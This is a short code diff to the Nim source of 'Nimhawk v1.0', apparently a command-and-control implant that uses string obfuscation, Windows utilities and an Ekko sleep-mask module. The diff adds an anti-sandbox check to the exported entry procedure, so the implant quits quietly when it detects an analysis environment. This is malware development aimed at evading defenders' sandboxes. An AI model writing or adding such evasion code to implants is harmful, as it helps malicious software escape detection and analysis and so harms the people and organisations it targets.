@@ -26,6 +26,8 @@ import config/configParser
 import util/[strenc, winUtils, register]
 import core/cmdParser
 
+import selfProtections/antiSandbox/antiSandbox
+
 when defined sleepmask:
     import selfProtections/ekko_sleep/ekko
 else:
@@ -46,6 +48,11 @@ const version: string = "=== Nimhawk v1.0 ==="
 # IMPORTANT: Export runNp correctly
 proc runNp() {.exportc, cdecl.} =
     echo version
+
+    # check if the process is running in a sandbox
+    if antiSandbox() > 0:
+        echo obf("DEBUG: Sandbox detected, exiting.")
+        quit(0)
 
     # Get configuration information and create Listener object
     var listener = Listener(
